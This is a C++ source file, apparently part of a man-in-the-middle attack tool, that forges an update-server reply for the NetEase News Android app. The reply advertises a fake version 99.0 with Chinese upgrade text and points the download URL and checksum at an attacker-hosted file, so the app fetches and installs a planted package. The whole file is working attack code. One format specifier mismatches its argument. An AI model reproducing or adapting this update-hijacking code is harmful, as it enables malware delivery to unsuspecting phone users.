


#include "neteasynews.h"
#include <windows.h>
#include <iostream>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "../HttpUtils.h"


using namespace std;


int NetEasyNews::prepareRespData(unsigned long ulIP,string filepath,string filename) {

	int ret = 0;

	string strver = "99.0";

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);
	if (ret == FALSE)
	{
		return FALSE;
	}

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json;charset=GBK\r\nContent-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"{ \"up\":{\"upgradeKey\":\"android_update_%u_release\",\"name\" : \"安卓37.0灰度发布\",\"upgradeType\" : \"update\","
		"\"fileUrl\" : \"http://%s/%s\","
		"\"upgradeTitle\" : \"37.0版本更新啦~\",\"upgradeMsg\" : \"新增视频播单功能，优化视频播放界面\","
		"\"noticeTitle\" : \"37.0版本已经准备好，一秒安装\",\"noticeMsg\" : \"新增视频播单功能，优化视频播放界面，快来试试吧~\","
		"\"intervalDays\" : 1,\"version\" : \"%s\",\"checksum\" : \"%s\"} }";

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
		strver.c_str(),
		szip.c_str(), filename.c_str(), strver.c_str(), m_szmd5);

	char lptmp[MAX_RESPONSE_HEADER_SIZE];
	int tmplen = sprintf_s(lptmp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);

	memcpy(m_lpResp, lptmp, tmplen);
	m_iRespSize = tmplen;
	//m_iRespSize = Public::GBKToUTF8(lptmp, tmplen, m_lpResp, MAX_RESPONSE_HEADER_SIZE);

	return m_iRespSize;

}